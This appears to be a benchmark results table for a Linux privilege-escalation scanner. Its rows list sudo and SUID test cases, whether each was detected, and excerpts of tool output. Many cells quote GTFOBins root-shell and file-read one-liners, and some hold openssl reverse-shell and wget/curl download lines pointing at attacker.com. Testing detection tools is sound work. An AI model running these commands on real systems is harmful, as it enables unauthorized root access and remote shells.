| `sudo-ld-preload` | 2213 | sudo-advanced | **Yes** | ldpreload + sudo_list (verified 2026-07-25 on 10.10.1.109) — Directive found \| ### Rules for lowpriv ### \| rule: /usr/bin/find \| gtfobins found (find): \| - sudo find . -exec /bin/sh \; -quit \| Matching Defaults entries fo |
| `sudo-less` | 2206 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/less \| gtfobins found (less): \| - sudo less /etc/profile \| - !/bin/sh \| Matching Defaults entries for lowpriv on ubun |
| `sudo-lua` | 2405 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail_badpass, \| secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/sn |
| `sudo-more` | 2353 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/more \| gtfobins found (more): \| - TERM= sudo more /etc/profile \| - !/bin/sh \| Matching Defaults entries for lowpriv o |
| `sudo-mv` | 2196 | sudo | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-nano` | 2207 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/nano \| gtfobins found (nano): \| - sudo nano \| - ^R^X \| - reset; sh 1>&0 2>&0 \| Matching Defaults entries for lowpriv |
| `sudo-nl` | 2293 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/nl \| gtfobins found (nl): \| - LFILE=file_to_read \| - sudo nl -bn -w1 -s '' $LFILE \| Matching Defaults entries for low |
| `sudo-noauth` | 2233 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-node` | 2371 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/node \| gtfobins found (node): \| - sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})' \| Matching Defaul |
| `sudo-nodepath` | 2272 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-npm` | 2252 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-od` | 2277 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/od \| gtfobins found (od): \| - LFILE=file_to_read \| - sudo od -An -c -w9999 "$LFILE" \| Matching Defaults entries for l |
| `sudo-openssl` | 2283 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/openssl \| gtfobins found (openssl): \| - RHOST=attacker.com \| - RPORT=12345 \| - mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>& |
| `sudo-paste` | 2324 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/paste \| gtfobins found (paste): \| - LFILE=file_to_read \| - sudo paste $LFILE \| Matching Defaults entries for lowpriv |
| `sudo-perl` | 2365 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/perl \| gtfobins found (perl): \| - sudo perl -e 'exec "/bin/sh";' \| Matching Defaults entries for lowpriv on ubuntu: \| |
| `sudo-perl-exec` | 2279 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/perl \| gtfobins found (perl): \| - sudo perl -e 'exec "/bin/sh";' \| Matching Defaults entries for lowpriv on ubuntu: \| |
| `sudo-perl5lib` | 2194 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-php` | 2367 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail_badpass, \| secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/sn |
| `sudo-pip` | 2248 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-pr` | 2304 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/pr \| gtfobins found (pr): \| - LFILE=file_to_read \| - pr -T $LFILE \| Matching Defaults entries for lowpriv on ubuntu: |
| `sudo-ps4` | 2254 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-ptx` | 2330 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail_badpass, \| secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/sn |
| `sudo-python` | 2208 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail_badpass, \| secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/sn |
| `sudo-pythonpath` | 2173 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-rev` | 2325 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/rev \| gtfobins found (rev): \| - LFILE=file_to_read \| - sudo rev $LFILE \| rev \| Matching Defaults entries for lowpriv |
| `sudo-rsync` | 2376 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/rsync \| gtfobins found (rsync): \| - sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null \| Matching Defaults entr |
| `sudo-ruby` | 2369 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail_badpass, \| secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/sn |
| `sudo-rubylib` | 2223 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-runas` | 2234 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-scp` | 2375 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: all \| ALL: all permissions \| rule: /usr/bin/scp \| gtfobins found (scp): \| - TF=$(mktemp) \| - echo 'sh 0<&2 1>&2' > $TF \| - chm |
| `sudo-sed` | 2197 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /bin/sed \| gtfobins found (sed): \| - sudo sed -n '1e exec sh 1>&0' /etc/hosts \| Matching Defaults entries for lowpriv on ubunt |
| `sudo-shelopts` | 2255 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-shuf` | 2299 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/shuf \| gtfobins found (shuf): \| - LFILE=file_to_write \| - sudo shuf -e DATA -o "$LFILE" \| Matching Defaults entries f |
| `sudo-sort` | 2303 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/sort \| gtfobins found (sort): \| - LFILE=file_to_read \| - sudo sort -m "$LFILE" \| Matching Defaults entries for lowpri |
| `sudo-split` | 2348 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/split \| gtfobins found (split): \| - split --filter=/bin/sh /dev/stdin \| Matching Defaults entries for lowpriv on ubun |
| `sudo-sqlite3` | 2396 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/sqlite3 \| gtfobins found (sqlite3): \| - sudo sqlite3 /dev/null '.shell /bin/sh' \| Matching Defaults entries for lowpr |
| `sudo-strings` | 2268 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail_badpass, \| secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/sn |
| `sudo-tac` | 2326 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/tac \| gtfobins found (tac): \| - LFILE=file_to_read \| - sudo tac -s 'RANDOM' "$LFILE" \| Matching Defaults entries for |
| `sudo-tail` | 2292 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/tail \| gtfobins found (tail): \| - LFILE=file_to_read \| - sudo tail -c1G "$LFILE" \| Matching Defaults entries for lowp |
| `sudo-tar` | 2209 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/tar \| gtfobins found (tar): \| - sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh \| Ma |
| `sudo-tee` | 2221 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: all \| ALL: all permissions \| rule: /usr/bin/tee \| gtfobins found (tee): \| - LFILE=file_to_write \| - echo DATA \| sudo tee -a "$ |
| `sudo-u-hash` | 2363 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-uniq` | 2305 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/uniq \| gtfobins found (uniq): \| - LFILE=file_to_read \| - sudo uniq "$LFILE" \| Matching Defaults entries for lowpriv o |
| `sudo-version-detect-only` | 2419 | services | **Yes** | system_info (verified 2026-07-25 on 10.10.1.109) — sudo-version: Sudo version 1.9.17p2 \| next: compare sudo -V to known CVEs; run sudo -l \| sudo-version: Sudo version 1.9.17p2 (from /opt/bench/sudo-version.txt) |
| `sudo-vim` | 2211 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — Matching Defaults entries for lowpriv on ubuntu: \| env_reset, mail_badpass, \| secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/sn |
| `sudo-wget` | 2204 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/wget \| gtfobins found (wget): \| - URL=http://attacker.com/file_to_get \| - LFILE=file_to_save \| - sudo wget $URL -O $L |
| `sudo-wildcard-tar` | 2236 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-writable-script` | 2172 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-24 on 10.10.1.109 — exact issue not flagged (sudo-* improvements deferred) |
| `sudo-xxd` | 2276 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/xxd \| gtfobins found (xxd): \| - LFILE=file_to_read \| - sudo xxd "$LFILE" \| xxd -r \| Matching Defaults entries for low |
| `sudo-yarn` | 2269 | sudo-advanced | **No** | verified 2026-07-25 on 10.10.1.109 — verified 2026-07-22 on 10.10.1.109 — no sudo rule found |
| `sudo-zip` | 2289 | sudo | **Yes** | sudo_list (verified 2026-07-25 on 10.10.1.109) — ### Rules for lowpriv ### \| rule: /usr/bin/zip \| gtfobins found (zip): \| - TF=$(mktemp -u) \| - sudo zip $TF /etc/hosts -T -TT 'sh #' \| - sudo rm $TF \| Matching |
| `suid-base64` | 2285 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/base64 [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo base64 "$LFILE" \| base64 --decode \| /usr/bin/umount \| / |
| `suid-cat` | 2426 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/cat [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo cat "$LFILE" \| /usr/lib/openssh/ssh-keysign [non-standard] |
| `suid-chmod` | 2195 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/bash [non-standard] \| [+] gtfobins found: \| - sudo bash \| [+] dynamic loads found: \| - relative module: libtinfo.so.6 \| - relative module: libc.so.6 \| |
| `suid-column` | 2343 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/column [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo column $LFILE \| [+] dynamic loads found: \| - relative module: q/lib64/ld-li |
| `suid-comm` | 2345 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/comm [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo comm $LFILE /dev/null 2>/dev/null \| /usr/lib/openssh/ssh- |
| `suid-cp` | 2199 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/gnucp [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_write \| - echo "DATA" \| sudo cp /dev/stdin "$LFILE" \| - ----LFILE=file_to_write \| - TF=$(m |
| `suid-csplit` | 2357 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/csplit [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - csplit $LFILE 1 \| - cat xx01 \| /usr/lib/openssh/ssh-keysign |
| `suid-curl` | 2370 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/curl [non-standard] \| [+] gtfobins found: \| - URL=http://attacker.com/file_to_get \| - LFILE=file_to_save \| - sudo curl $URL -o $LFILE \| [+] dynamic loa |
| `suid-cut` | 2399 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/cut [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo cut -d "" -f1 "$LFILE" \| /usr/lib/openssh/ssh-keysign [non |
| `suid-dd` | 2200 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/dd [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_write \| - echo "data" \| sudo dd of=$LFILE \| /usr/lib/openssh/ssh-keysign |
| `suid-diff` | 2425 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/diff [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo diff --line-format=%L /dev/null $LFILE \| [+] dynamic loads found: \| - relativ |
| `suid-dlopen` | 2242 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /opt/bench/suid_dlopen [non-standard] \| [+] dynamic loads found: \| - relative module: 1/lib64/ld-linux-x86-64.so.2 \| - relative module: libc.so.6 \| - /opt/bench |
| `suid-dos2unix` | 2401 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/dos2unix [non-standard] \| [+] dynamic loads found: \| - relative module: 8O/lib64/ld-linux-x86-64.so.2 \| - relative module: libc.so.6 \| /usr/lib/openssh |
| `suid-ed` | 2436 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/ed [non-standard] \| [+] gtfobins found: \| - sudo ed \| - !/bin/sh \| [+] system calls found: \| - mfUa -> mfUa \| - __libc_start_main -> __libc_start_main |
| `suid-env` | 2202 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/env [non-standard] \| [+] gtfobins found: \| - sudo env /bin/sh \| /usr/bin/umount \| /usr/bin/chsh \| /usr/bin/mount \| [+] gtfobins fou |
| `suid-expand` | 2358 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/expand [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo expand "$LFILE" \| /usr/lib/openssh/ssh-keysign [non-sta |
| `suid-find` | 2214 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/find [non-standard] \| [+] gtfobins found: \| - sudo find . -exec /bin/sh \; -quit \| [+] dynamic loads found: \| - relative module: libselinux.so.1 \| - re |
| `suid-fmt` | 2344 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/fmt [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo fmt -999 "$LFILE" \| /usr/lib/openssh/ssh-keysign [non-stan |
| `suid-fold` | 2331 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/fold [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo fold -w99999999 "$LFILE" \| /usr/lib/openssh/ssh-keysign [ |
| `suid-gawk` | 2201 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/gawk [non-standard] \| [+] gtfobins found: \| - sudo gawk 'BEGIN {system("/bin/sh")}' \| [+] dynamic loads found: \| - relative module: libreadline.so.8 \| |
| `suid-grep` | 2307 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/grep [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo grep '' $LFILE \| [+] dynamic loads found: \| - relative module: C/lib64/ld-lin |
| `suid-grep2` | 2427 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/grep [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo grep '' $LFILE \| [+] dynamic loads found: \| - relative module: C/lib64/ld-lin |
| `suid-hd` | 2332 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/hexdump [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo hexdump -C "$LFILE" \| [+] dynamic loads found: \| - relative module: libtin |
| `suid-head` | 2295 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/head [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo head -c1G "$LFILE" \| /usr/lib/openssh/ssh-keysign [non-st |
| `suid-hexdump` | 2355 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/hexdump [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo hexdump -C "$LFILE" \| [+] dynamic loads found: \| - relative module: libtin |
| `suid-iconv` | 2359 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/iconv [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - ./iconv -f 8859_1 -t 8859_1 "$LFILE" \| [+] dynamic loads found: \| - relative modu |
| `suid-install` | 2434 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/install [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_change \| - TF=$(mktemp) \| - sudo install -m 6777 $LFILE $TF \| /usr/b |
| `suid-install2` | 2453 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/install [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_change \| - TF=$(mktemp) \| - sudo install -m 6777 $LFILE $TF \| /usr/b |
| `suid-join` | 2356 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/join [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo join -a 2 /dev/null $LFILE \| /usr/lib/openssh/ssh-keysign |
| `suid-jq` | 2374 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/jq [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo jq -Rr . "$LFILE" \| [+] dynamic loads found: \| - relative module: libjq.so.1 \| |
| `suid-less` | 2452 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/less [non-standard] \| [+] gtfobins found: \| - sudo less /etc/profile \| - !/bin/sh \| [+] system calls found: \| - mfUa -> mfUa \| - __libc_start_main -> _ |
| `suid-lua` | 2406 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/lua5.4 [non-standard] \| [+] gtfobins found: \| - sudo lua -e 'os.execute("/bin/sh")' \| [+] system calls found: \| - qw_L2m -> qw_L2m \| - Ua91.H -> Ua91.H |
| `suid-more` | 2286 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/more [non-standard] \| [+] gtfobins found: \| - TERM= sudo more /etc/profile \| - !/bin/sh \| [+] dynamic loads found: \| - relative module: libtinfo.so.6 \| |
| `suid-nl` | 2309 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/nl [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo nl -bn -w1 -s '' $LFILE \| /usr/lib/openssh/ssh-keysign [non |
| `suid-node` | 2372 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/node [non-standard] \| [+] gtfobins found: \| - sudo node -e 'child_process.spawn("/bin/sh", {stdio: [0, 1, 2]})' \| [+] dynamic loads found: \| - relative |
| `suid-od` | 2402 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/od [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo od -An -c -w9999 "$LFILE" \| /usr/lib/openssh/ssh-keysign [n |
| `suid-openssl` | 2429 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/openssl [non-standard] \| [+] gtfobins found: \| - RHOST=attacker.com \| - RPORT=12345 \| - mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 \| sudo openssl s_client |
| `suid-paste` | 2335 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/paste [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo paste $LFILE \| /usr/lib/openssh/ssh-keysign [non-standar |
| `suid-path-hijack` | 2224 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /opt/bench/suid_path [non-standard] \| [+] system calls found: \| - __libc_start_main -> __libc_start_main \| - __cxa_finalize -> __cxa_finalize \| - libc.so.6 -> l |
| `suid-perl` | 2366 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/perl [non-standard] \| [+] gtfobins found: \| - sudo perl -e 'exec "/bin/sh";' \| /usr/lib/openssh/ssh-keysign [non-standard] \| [+] dynamic loads found: \| |
| `suid-php` | 2368 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/php8.5 [non-standard] \| [+] gtfobins found: \| - CMD="/bin/sh" \| - sudo php -r "system('$CMD');" \| /usr/lib/openssh/ssh-keysign [non-standard] \| [+] dyn |
| `suid-pr` | 2340 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/pr [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - pr -T $LFILE \| /usr/lib/openssh/ssh-keysign [non-standard] \| [+] |
| `suid-ptx` | 2347 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/ptx [non-standard] \| /usr/lib/openssh/ssh-keysign [non-standard] \| [+] dynamic loads found: \| - relative module: libcrypto.so.3 \| - |
| `suid-python` | 2215 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/python3.14 [non-standard] \| [+] gtfobins found: \| - sudo python -c 'import os; os.system("/bin/sh")' \| /usr/lib/openssh/ssh-keysign [non-standard] \| [+ |
| `suid-rev` | 2333 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/rev [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo rev $LFILE \| rev \| [+] dynamic loads found: \| - relative module: $/lib64/ld-li |
| `suid-rsync` | 2377 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/rsync [non-standard] \| [+] gtfobins found: \| - sudo rsync -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null \| [+] system calls found: \| - mfUa -> mfUa \| - |
| `suid-sed` | 2432 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/sed [non-standard] \| [+] gtfobins found: \| - sudo sed -n '1e exec sh 1>&0' /etc/hosts \| [+] dynamic loads found: \| - relative module: %/lib64/ld-linux- |
| `suid-shuf` | 2430 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/shuf [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_write \| - sudo shuf -e DATA -o "$LFILE" \| /usr/lib/openssh/ssh-keysign |
| `suid-sort` | 2308 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/sort [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo sort -m "$LFILE" \| /usr/lib/openssh/ssh-keysign [non-stan |
| `suid-split` | 2403 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/split [non-standard] \| [+] gtfobins found: \| - split --filter=/bin/sh /dev/stdin \| /usr/lib/openssh/ssh-keysign [non-standard] \| [+ |
| `suid-sqlite3` | 2397 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/sqlite3 [non-standard] \| [+] gtfobins found: \| - sudo sqlite3 /dev/null '.shell /bin/sh' \| [+] system calls found: \| - h OG -> OG \| - __gmon_start__ -> |
| `suid-strings` | 2404 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/x86_64-linux-gnu-strings [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo strings "$LFILE" \| [+] dynamic loads found: \| - relative |
| `suid-strings2` | 2433 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/x86_64-linux-gnu-strings [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo strings "$LFILE" \| [+] dynamic loads found: \| - relative |
| `suid-tac` | 2334 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/tac [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo tac -s 'RANDOM' "$LFILE" \| /usr/lib/openssh/ssh-keysign [n |
| `suid-tail` | 2296 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/tail [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo tail -c1G "$LFILE" \| /usr/lib/openssh/ssh-keysign [non-st |
| `suid-uniq` | 2341 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/lib/cargo/bin/coreutils/uniq [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo uniq "$LFILE" \| /usr/lib/openssh/ssh-keysign [non-standar |
| `suid-writable` | 2176 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /opt/bench/suidbin [writable root-owned executable] \| /usr/bin/umount \| /usr/bin/chsh \| /usr/bin/mount \| [+] gtfobins found: \| - sudo mount -o bind /bin/sh /bin |
| `suid-writable-exec` | 2225 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /opt/bench/suid_exec [non-standard] \| [+] exec calls found: \| - /opt/bench/helper [writable] \| [+] dynamic loads found: \| - relative module: libc.so.6 \| /usr/li |
| `suid-xxd` | 2428 | suid | **Yes** | suid_bins (verified 2026-07-25 on 10.10.1.109) — /usr/bin/xxd [non-standard] \| [+] gtfobins found: \| - LFILE=file_to_read \| - sudo xxd "$LFILE" \| xxd -r \| [+] dynamic loads found: \| - relative module: */lib64/ |
